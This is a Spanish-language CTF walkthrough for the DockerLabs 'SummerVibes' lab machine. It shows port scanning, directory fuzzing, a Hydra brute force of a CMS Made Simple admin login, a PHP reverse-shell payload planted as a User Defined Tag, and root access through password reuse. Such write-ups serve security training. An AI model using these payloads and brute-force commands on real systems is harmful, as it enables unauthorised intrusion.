---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SummerVibes DockerLabs (Hard)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip summervibes.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh summervibes.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 11:56 EST
Nmap scan report for express.dl (172.17.0.2)
Host is up (0.000026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d1:19:f1:fa:48:16:af:8a:4a:89:2d:78:89:e9:2d:94 (ECDSA)
|_  256 b8:b7:2e:64:3e:ee:c3:2e:2e:be:99:07:4e:02:4f:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.14 seconds
```

Si inspeccionamos la pagina vemos el siguiente comentario.

```html
<!-- cms made simple is installed here - Access to it - cmsms -->
```

Puede ser que sea el nombre de un directorio, por lo que haremos lo siguiente:

```
URL = http://<IP>/cmsms/
```

Y veremos una pagina web normal, por lo que `fuzzearemos` un poco.

```shell
gobuster dir -u http://<IP>/cmsms/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/cmsms/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/admin                (Status: 200) [Size: 4568]
/assets               (Status: 200) [Size: 2145]
/config.php           (Status: 200) [Size: 0]
/doc                  (Status: 200) [Size: 24]
/index.php            (Status: 200) [Size: 19671]
/lib                  (Status: 200) [Size: 24]
/modules              (Status: 200) [Size: 3397]
/tmp                  (Status: 200) [Size: 1147]
/uploads              (Status: 200) [Size: 1543]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos uno bastante llamativo llamado `admin`, que si entramos en el veremos un login de admin, por lo que le vamos a dar a `Forgot your password?` y pondremos `admin` para saber si el usuario existe, si lo hacemos vemos que existe, por lo que intentaremos fuerza bruta con `hydra` al login:

## Escalate user www-data

### Hydra

```shell
hydra -l admin -P <WORDLIST> <IP> http-post-form "/cmsms/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-13 12:07:19
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://172.17.0.2:80/cmsms/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect
[80][http-post-form] host: 172.17.0.2   login: admin   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-13 12:07:21
```

Vemos que hemos encontrado las credenciales, por lo que nos conectaremos a la web con dichas credenciales y entraremos en el panel de `admin` si nos vamos a `extensions` -> `User Definded Tags` -> `Add User Defined Tag`

Veremos un cuadro en el que podremos meter codigo, por lo que meteremos lo siguiente:

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Le ponemos como nombre `shell`.

<figure><img src="../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

Le daremos a `Sumbit`, volvemos a entrar a `shell`, le daremos al boton `Apply` y antes de darle a `run` nos pondremos a la escucha.

```shell
nc -lvnp <PORT>
```

Una vez estando asi, le daremos a `run` en la pagina y cuando volvamos a la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.120.128] from (UNKNOWN) [172.17.0.2] 42832
whoami
www-data
```

### Sanitizacion shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si reutilizamos la contraseña que encontramos en el panel de la pagina que era `chocolate` con `root`.

```shell
su root
```

Metemos como contraseña `chocolate` y veremos que somo el usuario `root`.
